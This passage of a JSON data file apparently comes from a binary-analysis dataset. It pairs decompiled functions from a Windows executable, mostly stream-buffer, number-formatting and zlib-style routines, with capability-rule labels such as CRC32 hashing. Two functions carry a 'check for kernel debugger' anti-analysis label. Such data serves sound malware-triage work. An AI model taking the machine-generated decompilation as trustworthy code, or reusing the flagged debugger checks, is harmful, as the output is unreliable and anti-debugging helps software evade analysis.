(-1 < arg_10h) {\n            uVar2 = *(in_ECX + 0x3c) - **(in_ECX + 0x10);\n            iVar4 = uVar2 >> 0x1f;\n            if ((arg_10h <= iVar4) && ((arg_10h < iVar4 || (arg_ch <= uVar2)))) {\n                iVar5 = (**(in_ECX + 0x10) - iVar5) + arg_ch;\n                **(in_ECX + 0x30) = **(in_ECX + 0x30) - iVar5;\n                **(in_ECX + 0x20) = **(in_ECX + 0x20) + iVar5;\n                if (((arg_18h & 2) != 0) && (iVar5 = **(in_ECX + 0x24),  iVar5 != 0)) {\n                    iVar4 = **(in_ECX + 0x34);\n                    iVar1 = **(in_ECX + 0x20);\n                    **(in_ECX + 0x24) = iVar1;\n                    **(in_ECX + 0x34) = (iVar4 + iVar5) - iVar1;\n                }\n                goto code_r0x0042108d;\n            }\n        }\n    }\n    arg_10h = *0x448784;\n    arg_ch = *0x448780;\ncode_r0x0042108d:\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    return;\n}\n",
        "token_count": 1287
    },
    "004210b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004210b0(uint32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, uint noname_4, uint noname_5, \n            uint noname_6, uint32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_4h;\n    \n    uVar8 = arg_14h + arg_ch;\n    uVar7 = **(in_ECX + 0x24);\n    uVar6 = (arg_14h >> 0x1f) + arg_10h + CARRY4(arg_14h, arg_ch);\n    if ((uVar7 != 0) && (*(in_ECX + 0x3c) < uVar7)) {\n        *(in_ECX + 0x3c) = uVar7;\n    }\n    if ((uVar8 != *0x448780) || (uVar7 = uVar6,  uVar9 = uVar8,  uVar6 != *0x448784)) {\n        uVar7 = *0x448784;\n        uVar9 = *0x448780;\n        if (((arg_24h & 1) == 0) || (**(in_ECX + 0x20) == 0)) {\n            if ((((arg_24h & 2) != 0) && (uVar3 = **(in_ECX + 0x24),  uVar3 != 0)) && (-1 < uVar6)) {\n                uVar4 = *(in_ECX + 0x3c) - **(in_ECX + 0x10);\n                iVar5 = uVar4 >> 0x1f;\n                if ((uVar6 <= iVar5) && ((uVar6 < iVar5 || (uVar8 <= uVar4)))) {\n                    iVar5 = (**(in_ECX + 0x10) - uVar3) + uVar8;\n                    **(in_ECX + 0x34) = **(in_ECX + 0x34) - iVar5;\n                    **(in_ECX + 0x24) = **(in_ECX + 0x24) + iVar5;\n                    uVar7 = uVar6;\n                    uVar9 = uVar8;\n                }\n            }\n        }\n        else if (-1 < uVar6) {\n            uVar3 = *(in_ECX + 0x3c) - **(in_ECX + 0x10);\n            iVar5 = uVar3 >> 0x1f;\n            if ((uVar6 <= iVar5) && ((uVar6 < iVar5 || (uVar8 <= uVar3)))) {\n                iVar5 = (**(in_ECX + 0x10) - **(in_ECX + 0x20)) + uVar8;\n                **(in_ECX + 0x30) = **(in_ECX + 0x30) - iVar5;\n                **(in_ECX + 0x20) = **(in_ECX + 0x20) + iVar5;\n                uVar7 = uVar6;\n                uVar9 = uVar8;\n                if (((arg_24h & 2) != 0) && (iVar5 = **(in_ECX + 0x24),  iVar5 != 0)) {\n                    iVar1 = **(in_ECX + 0x20);\n                    iVar2 = **(in_ECX + 0x34);\n                    **(in_ECX + 0x24) = iVar1;\n                    **(in_ECX + 0x34) = (iVar2 + iVar5) - iVar1;\n                }\n            }\n        }\n    }\n    *arg_8h = uVar9;\n    arg_8h[1] = uVar7;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    return;\n}\n",
        "token_count": 958
    },
    "004211d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004211d0(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *in_ECX;\n    \n    piVar1 = in_ECX + -2;\n    *(*(*piVar1 + 4) + -8 + in_ECX) = 0x447f78;\n    *in_ECX = 0x447298;\n    fcn.0042a309(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679(piVar1);\n    }\n    return piVar1;\n}\n",
        "token_count": 139
    },
    "00421210": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00421210(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *in_ECX;\n    \n    piVar1 = in_ECX + -6;\n    *(*(*piVar1 + 4) + -0x18 + in_ECX) = 0x447f80;\n    *(*(in_ECX[-2] + 4) + -8 + in_ECX) = 0x447f78;\n    *(*(in_ECX[-6] + 4) + -0x18 + in_ECX) = 0x4477c0;\n    *in_ECX = 0x447298;\n    fcn.0042a309(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679(piVar1);\n    }\n    return piVar1;\n}\n",
        "token_count": 201
    },
    "00421270": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421270(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x447f8c;\n    fcn.00420dd0();\n    fcn.00418650();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "004212a0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004212a0(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x447290;\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "00421670": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00421670(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uchar *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t arg_8h_00;\n    int32_t iVar6;\n    int32_t in_ECX;\n    uint32_t uVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_ECX + 0x40) & 8) != 0) {\n        uVar7 = **(in_ECX + 0x24);\n        if ((uVar7 != 0) && (uVar4 = *(in_ECX + 0x3c),  uVar7 < uVar4)) {\n            iVar1 = **(in_ECX + 0x34);\n            **(in_ECX + 0x24) = uVar4;\n            **(in_ECX + 0x34) = (iVar1 + uVar7) - uVar4;\n        }\n    }\n    if (arg_8h == -1) {\n        return 0;\n    }\n    uVar7 = **(in_ECX + 0x24);\n    if ((uVar7 != 0) && (piVar2 = *(in_ECX + 0x34),  uVar7 < *piVar2 + uVar7)) {\n        *piVar2 = *piVar2 + -1;\n        goto code_r0x004217fd;\n    }\n    if ((*(in_ECX + 0x40) & 2) != 0) {\n        return -1;\n    }\n    if (uVar7 == 0) {\n        uVar7 = 0;\n    }\n    else {\n        uVar7 = (**(in_ECX + 0x34) - **(in_ECX + 0x10)) + uVar7;\n    }\n    uVar4 = uVar7 >> 1;\n    if (uVar4 < 0x20) {\n        uVar4 = 0x20;\n    }\n    else if (uVar4 == 0) {\n        return -1;\n    }\n    do {\n        if (uVar7 <= 0x7fffffff - uVar4) break;\n        uVar4 = uVar4 >> 1;\n    } while (uVar4 != 0);\n    if (uVar4 == 0) {\n        return -1;\n    }\n    iVar5 = uVar4 + uVar7;\n    arg_8h_00 = fcn.00405b50(iVar5);\n    iVar1 = **(in_ECX + 0x10);\n    if ((uVar7 == 0) || (fcn.0042a840(arg_8h_00, iVar1, uVar7),  uVar7 == 0)) {\n        *(in_ECX + 0x3c) = arg_8h_00;\n        **(in_ECX + 0x14) = arg_8h_00;\n        **(in_ECX + 0x24) = arg_8h_00;\n        **(in_ECX + 0x34) = iVar5;\n        if ((*(in_ECX + 0x40) & 4) != 0) goto code_r0x004217ad;\n        **(in_ECX + 0x10) = arg_8h_00;\n        **(in_ECX + 0x20) = arg_8h_00;\n        **(in_ECX + 0x30) = 1;\n    }\n    else {\n        *(in_ECX + 0x3c) = *(in_ECX + 0x3c) + (arg_8h_00 - iVar1);\n        iVar6 = **(in_ECX + 0x24);\n        **(in_ECX + 0x14) = **(in_ECX + 0x14) + (arg_8h_00 - iVar1);\n        iVar6 = (iVar6 - iVar1) + arg_8h_00;\n        **(in_ECX + 0x24) = iVar6;\n        **(in_ECX + 0x34) = (arg_8h_00 - iVar6) + iVar5;\n        if ((*(in_ECX + 0x40) & 4) == 0) {\n            iVar5 = **(in_ECX + 0x24);\n            iVar6 = (**(in_ECX + 0x20) - iVar1) + arg_8h_00;\n            **(in_ECX + 0x10) = arg_8h_00;\n            **(in_ECX + 0x20) = iVar6;\n            **(in_ECX + 0x30) = (iVar5 - iVar6) + 1;\n        }\n        else {\ncode_r0x004217ad:\n            **(in_ECX + 0x10) = arg_8h_00;\n            **(in_ECX + 0x20) = 0;\n            **(in_ECX + 0x30) = arg_8h_00;\n        }\n    }\n    if ((*(in_ECX + 0x40) & 1) != 0) {\n        fcn.0042a679(iVar1);\n    }\n    *(in_ECX + 0x40) = *(in_ECX + 0x40) | 1;\n    **(in_ECX + 0x34) = **(in_ECX + 0x34) + -1;\ncode_r0x004217fd:\n    puVar3 = **(in_ECX + 0x24);\n    **(in_ECX + 0x24) = puVar3 + 1;\n    *puVar3 = arg_8h;\n    return arg_8h;\n}\n",
        "token_count": 1308
    },
    "00421820": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00421820(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.004214d0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679(in_ECX + -0x50);\n    }\n    return in_ECX + -0x50;\n}\n",
        "token_count": 86
    },
    "004219d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004219d0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t arg_8h_00;\n    bool bVar3;\n    int32_t *in_FS_OFFSET;\n    ulong uVar4;\n    uint var_34h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e47b;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    bVar3 = false;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        puVar2 = fcn.0042b2b1(0x10);\n        var_4h = 0;\n        if (puVar2 == NULL) {\n            puVar2 = NULL;\n        }\n        else {\n            arg_8h_00 = *(*arg_ch + 0x18);\n            if (arg_8h_00 == 0) {\n                arg_8h_00 = *arg_ch + 0x1c;\n            }\n            fcn.00418b60(arg_8h_00);\n            bVar3 = true;\n            puVar2[1] = 0;\n            *puVar2 = 0x447fd4;\n            uVar4 = fcn.0042a56e(arg_8h_00, uVar1);\n            puVar2[2] = uVar4;\n            puVar2[3] = uVar4 >> 0x20;\n        }\n        var_4h = 0xffffffff;\n        *arg_8h = puVar2;\n        if (bVar3) {\n            fcn.00418c10();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 4;\n}\n",
        "token_count": 458
    },
    "00421ab0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421ab0(uint32_t arg_8h)\n\n{\n    char **in_ECX;\n    \n    *in_ECX = \"invalid distance code\";\n    fcn.0042bc28(in_ECX[2]);\n    fcn.0042bc28(in_ECX[4]);\n    fcn.0042bc28(in_ECX[5]);\n    *in_ECX = 0x447290;\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00421b20": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00421b20(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    fcn.004215e0();\n    *in_ECX = 0x447298;\n    fcn.0042a309(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679(in_ECX + -0x18);\n    }\n    return in_ECX + -0x18;\n}\n",
        "token_count": 109
    },
    "00421d60": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00421d60(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    char **ppcVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    bool bVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_38h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ee8c;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    bVar4 = false;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        ppcVar2 = fcn.0042b2b1(0x18);\n        var_4h = 0;\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            arg_8h_00 = *(*arg_ch + 0x18);\n            if (arg_8h_00 == 0) {\n                arg_8h_00 = *arg_ch + 0x1c;\n            }\n            uVar3 = fcn.00418b60(arg_8h_00);\n            bVar4 = true;\n            ppcVar2[1] = NULL;\n            var_4h = 2;\n            *ppcVar2 = \"invalid distance code\";\n            fcn.00421390(uVar3, 1, arg_8h_00, uVar1);\n        }\n        *arg_8h = ppcVar2;\n        var_4h = 0xffffffff;\n        if (bVar4) {\n            fcn.00418c10();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 4;\n}\n",
        "token_count": 454
    },
    "00422e10": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00422edd)\n\nvoid __cdecl fcn.00422e10(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uchar uVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f03f;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_ch != 0) {\n        *in_ECX = 0x448024;\n        in_ECX[0x14] = 0x4477c8;\n        var_4h = 0;\n    }\n    *(in_ECX + *(*in_ECX + 4)) = 0x447f78;\n    iVar1 = *(*in_ECX + 4);\n    fcn.00418570(uVar3);\n    *(in_ECX + iVar1 + 0x38) = in_ECX + 1;\n    *(in_ECX + iVar1 + 0x3c) = 0;\n    uVar2 = fcn.00419580(0x20);\n    *(in_ECX + iVar1 + 0x40) = uVar2;\n    if (*(in_ECX + iVar1 + 0x38) == 0) {\n        fcn.00418440(*(in_ECX + iVar1 + 0xc) | 4, 0);\n    }\n    *(in_ECX + *(*in_ECX + 4)) = 0x447fcc;\n    var_4h = 2;\n    fcn.00418ec0();\n    uVar3 = 0;\n    in_ECX[1] = 0x447f8c;\n    if ((arg_8h & 1) == 0) {\n        uVar3 = 4;\n    }\n    if ((arg_8h & 8) != 0) {\n        uVar3 = uVar3 | 8;\n    }\n    if ((arg_8h & 4) != 0) {\n        uVar3 = uVar3 | 0x10;\n    }\n    in_ECX[0x11] = uVar3;\n    in_ECX[0x10] = 0;\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 587
    },
    "00423330": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00423330(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    uint arg_30h;\n    char cVar3;\n    uint in_ECX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t arg_28h;\n    bool bVar6;\n    double in_stack_00000018;\n    uint var_8ch;\n    uint var_88h;\n    uint32_t var_84h;\n    uint32_t var_80h;\n    uint var_78h;\n    uint var_ch;\n    uchar auStack12 [4];\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    uVar5 = *(arg_14h + 0x18);\n    iVar1 = *(arg_14h + 0x1c);\n    arg_28h = 0;\n    if ((iVar1 < 1) && (((iVar1 < 0 || (uVar5 == 0)) && ((*(arg_14h + 0x14) & 0x2000) == 0)))) {\n        uVar5 = 6;\n        iVar1 = 0;\n    }\n    var_84h = uVar5;\n    if ((-1 < iVar1) && ((0 < iVar1 || (0x24 < uVar5)))) {\n        var_84h = 0x24;\n    }\n    uVar5 = uVar5 - var_84h;\n    iVar1 = (iVar1 - (var_84h >> 0x1f)) - (uVar5 < var_84h);\n    uVar4 = *(arg_14h + 0x14);\n    var_80h = 0;\n    if (((uVar4 & 0x3000) == 0x2000) && (in_stack_00000018 != *0x448058 * in_stack_00000018)) {\n        if (((0.0 < in_stack_00000018) << 8 | (in_stack_00000018 == 0.0) << 0xe) == 0) {\n            in_stack_00000018 = -in_stack_00000018;\n        }\n        if (str.invalid_bit_length_repeat._16_8_ < in_stack_00000018 !=\n            (str.invalid_bit_length_repeat._16_8_ == in_stack_00000018)) {\n            do {\n                if (4999 < var_80h) break;\n                in_stack_00000018 = in_stack_00000018 / str.invalid_bit_length_repeat._8_8_;\n                var_80h = var_80h + 10;\n            } while (str.invalid_bit_length_repeat._16_8_ < in_stack_00000018 !=\n                     (str.invalid_bit_length_repeat._16_8_ == in_stack_00000018));\n        }\n        if ((0.0 < in_stack_00000018) && (-1 < iVar1)) {\n            if (0 < iVar1) goto code_r0x00423448;\n            while (9 < uVar5) {\ncode_r0x00423448:\n                do {\n                    if ((str.invalid_bit_length_repeat._0_8_ < in_stack_00000018) || (4999 < arg_28h))\n                    goto code_r0x0042347d;\n                    bVar6 = 9 < uVar5;\n                    uVar5 = uVar5 - 10;\n                    iVar1 = iVar1 + -1 + bVar6;\n                    in_stack_00000018 = in_stack_00000018 * str.invalid_bit_length_repeat._8_8_;\n                    arg_28h = arg_28h + 10;\n                } while (0 < iVar1);\n                if (iVar1 < 0) break;\n            }\n        }\n    }\ncode_r0x0042347d:\n    var_ch._0_1_ = 0x25;\n    puVar2 = &var_ch + 1;\n    if ((uVar4 & 0x20) != 0) {\n        var_ch._1_1_ = 0x2b;\n        puVar2 = &var_ch + 2;\n    }\n    if ((uVar4 & 0x10) != 0) {\n        *puVar2 = 0x23;\n        puVar2 = puVar2 + 1;\n    }\n    uVar4 = uVar4 & 0x3000;\n    *puVar2 = 0x2a2e;\n    if (uVar4 == 0x2000) {\n        cVar3 = 'f';\n    }\n    else if (uVar4 == 0x3000) {\n        cVar3 = 'a';\n    }\n    else {\n        cVar3 = (uVar4 != 0x1000) * '\\x02' + 'e';\n    }\n    *(puVar2 + 1) = cVar3;\n    *(puVar2 + 3) = 0;\n    arg_30h = fcn.0042e5b9(&var_78h, 0x6c, &var_ch, var_84h);\n    fcn.00422610(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_78h, var_80h, arg_28h, uVar5, arg_30h);\n    fcn.0042a75a(in_ECX);\n    return;\n}\n",
        "token_count": 1267
    },
    "00423540": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00423540(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    uint arg_30h;\n    char cVar3;\n    uint in_ECX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t arg_28h;\n    bool bVar6;\n    double in_stack_00000018;\n    uint var_8ch;\n    uint var_88h;\n    uint32_t var_84h;\n    uint32_t var_80h;\n    uint var_78h;\n    uint var_ch;\n    char acStack12 [4];\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    uVar5 = *(arg_14h + 0x18);\n    iVar1 = *(arg_14h + 0x1c);\n    arg_28h = 0;\n    if ((iVar1 < 1) && (((iVar1 < 0 || (uVar5 == 0)) && ((*(arg_14h + 0x14) & 0x2000) == 0)))) {\n        uVar5 = 6;\n        iVar1 = 0;\n    }\n    var_84h = uVar5;\n    if ((-1 < iVar1) && ((0 < iVar1 || (0x24 < uVar5)))) {\n        var_84h = 0x24;\n    }\n    uVar5 = uVar5 - var_84h;\n    iVar1 = (iVar1 - (var_84h >> 0x1f)) - (uVar5 < var_84h);\n    uVar4 = *(arg_14h + 0x14);\n    var_80h = 0;\n    if ((uVar4 & 0x3000) == 0x2000) {\n        if (in_stack_00000018 < 0.0) {\n            in_stack_00000018 = -in_stack_00000018;\n        }\n        if (str.invalid_bit_length_repeat._16_8_ < in_stack_00000018 !=\n            (str.invalid_bit_length_repeat._16_8_ == in_stack_00000018)) {\n            do {\n                if (4999 < var_80h) break;\n                in_stack_00000018 = in_stack_00000018 / str.invalid_bit_length_repeat._8_8_;\n                var_80h = var_80h + 10;\n            } while (str.invalid_bit_length_repeat._16_8_ < in_stack_00000018 !=\n                     (str.invalid_bit_length_repeat._16_8_ == in_stack_00000018));\n        }\n        if ((0.0 < in_stack_00000018) && (-1 < iVar1)) {\n            if (0 < iVar1) goto code_r0x0042363d;\n            while (9 < uVar5) {\ncode_r0x0042363d:\n                do {\n                    if ((str.invalid_bit_length_repeat._0_8_ < in_stack_00000018) || (4999 < arg_28h))\n                    goto code_r0x0042367b;\n                    bVar6 = 9 < uVar5;\n                    uVar5 = uVar5 - 10;\n                    iVar1 = iVar1 + -1 + bVar6;\n                    in_stack_00000018 = in_stack_00000018 * str.invalid_bit_length_repeat._8_8_;\n                    arg_28h = arg_28h + 10;\n                } while (0 < iVar1);\n                if (iVar1 < 0) break;\n            }\n        }\n    }\ncode_r0x0042367b:\n    var_ch._0_1_ = 0x25;\n    puVar2 = &var_ch + 1;\n    if ((uVar4 & 0x20) != 0) {\n        var_ch._1_1_ = 0x2b;\n        puVar2 = &var_ch + 2;\n    }\n    if ((uVar4 & 0x10) != 0) {\n        *puVar2 = 0x23;\n        puVar2 = puVar2 + 1;\n    }\n    uVar4 = uVar4 & 0x3000;\n    *puVar2 = 0x2a2e;\n    *(puVar2 + 1) = 0x4c;\n    if (uVar4 == 0x2000) {\n        cVar3 = 'f';\n    }\n    else if (uVar4 == 0x3000) {\n        cVar3 = 'a';\n    }\n    else {\n        cVar3 = (uVar4 != 0x1000) * '\\x02' + 'e';\n    }\n    *(puVar2 + 3) = cVar3;\n    *(puVar2 + 2) = 0;\n    arg_30h = fcn.0042e5b9(&var_78h, 0x6c, &var_ch, var_84h);\n    fcn.00422610(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_78h, var_80h, arg_28h, uVar5, arg_30h);\n    fcn.0042a75a(in_ECX);\n    return;\n}\n",
        "token_count": 1238
    },
    "00426ea0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00426ea0(uint arg_8h, uint32_t *arg_ch, uint32_t *arg_10h, uint *arg_14h, uint32_t *arg_18h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint unaff_EDI;\n    ulong uVar5;\n    uint arg_8h_00;\n    uint var_6ch;\n    int32_t var_68h;\n    uint32_t *var_64h;\n    int32_t var_60h;\n    uint32_t var_5ch;\n    uint32_t *var_58h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    uint32_t var_3ch;\n    int32_t var_38h;\n    uint32_t var_34h;\n    uint32_t *var_30h;\n    uint var_14h;\n    uint var_eh;\n    uint var_ah;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    var_64h = arg_ch;\n    var_58h = arg_18h;\n    arg_8h_00 = arg_8h;\n    iVar2 = (**0x462fc8)(arg_8h, &var_48h);\n    if (iVar2 == 0) {\n        fcn.0042a75a(unaff_EDI);\n        return;\n    }\n    uVar3 = (var_48h & 1) != 0;\n    if ((var_48h & 2) != 0) {\n        uVar3 = uVar3 | 2;\n    }\n    if ((var_48h & 4) != 0) {\n        uVar3 = uVar3 | 4;\n    }\n    if ((var_48h & 0x10) != 0) {\n        uVar3 = uVar3 | 0x10;\n    }\n    if ((var_48h & 0x20) != 0) {\n        uVar3 = uVar3 | 0x20;\n    }\n    if ((var_48h & 0x10) == 0) {\n        uVar3 = uVar3 | 0x80000000;\n    }\n    else {\n        uVar3 = uVar3 | 0x40000000;\n    }\n    uVar4 = uVar3 | 0x1000000;\n    if ((var_48h & 1) == 0) {\n        uVar4 = uVar3 | 0x1800000;\n    }\n    var_50h = (**0x4630a8)(arg_8h, 0);\n    if (0x28 < var_50h) {\n        (**0x462ee8)(arg_8h, 0, 0, 0);\n        (**0x462ff4)(arg_8h, &var_4ch, 2, &var_54h, 0);\n        (**0x462ee8)(arg_8h, 0x24, 0, 0);\n        (**0x462ff4)(arg_8h, &var_68h, 4, &var_54h, 0);\n        if ((var_4ch == 0x54ad) && (var_68h + 0x34U < var_50h)) {\n            (**0x462ee8)(arg_8h, var_68h, 0, 0);\n            (**0x462ff4)(arg_8h, &var_60h, 4, &var_54h, 0);\n            if ((var_60h == 0x5a4d) || (((var_60h == 0x454e || (var_60h == 0x454c)) || (var_60h == 0x4550)))) {\n                uVar4 = uVar4 | 0x400000;\n            }\n        }\n    }\n    if (var_64h != NULL) {\n        *var_64h = uVar4;\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = var_50h;\n    }\n    if (arg_14h != NULL) {\n        uVar5 = fcn.0042d350(var_3ch + 0x2ac18000, (var_38h + -0x19db1de) - (var_3ch < 0xd53e8000), 10000000, 0);\n        arg_14h[1] = uVar5 >> 0x20;\n        *arg_14h = uVar5;\n        uVar5 = fcn.0042d350(var_34h + 0x2ac18000, var_30h + (-0x19db1de - (var_34h < 0xd53e8000)), 10000000, 0);\n        arg_14h[2] = uVar5;\n        arg_14h[3] = uVar5 >> 0x20;\n        uVar5 = fcn.0042d350(var_44h + 0x2ac18000, (var_40h + -0x19db1de) - (var_44h < 0xd53e8000), 10000000, 0);\n        arg_14h[4] = uVar5;\n        arg_14h[5] = uVar5 >> 0x20;\n    }\n    puVar1 = var_58h;\n    if (var_58h != NULL) {\n        var_5ch = var_34h;\n        var_58h = var_30h;\n        (**0x4630cc)(&var_5ch, &var_14h);\n        *puVar1 = (((CONCAT22(var_14h._2_2_, var_14h) + -0x3c) * 0x10 & 0x7ffU | var_14h._2_2_ & 0xf) << 5 |\n                  var_eh & 0x1f) << 0x10 | (var_ah & 0x3f | (var_eh._2_2_ & 0x1f) << 6) << 5 | var_ah._2_2_ * 2 & 0x1f;\n    }\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1502
    },
    "004279a0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004279a0(uint32_t arg_8h)\n\n{\n    int32_t *in_ECX;\n    \n    if (in_ECX[0x12] != 0) {\n        fcn.0042a679(in_ECX[0x12]);\n    }\n    in_ECX[0x12] = 0;\n    if (in_ECX[0xf] != 0) {\n        fcn.0042a679(in_ECX[0xf]);\n    }\n    in_ECX[0xf] = 0;\n    if (*in_ECX != 0) {\n        fcn.0042a679(*in_ECX);\n    }\n    *in_ECX = 0;\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00427a00": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
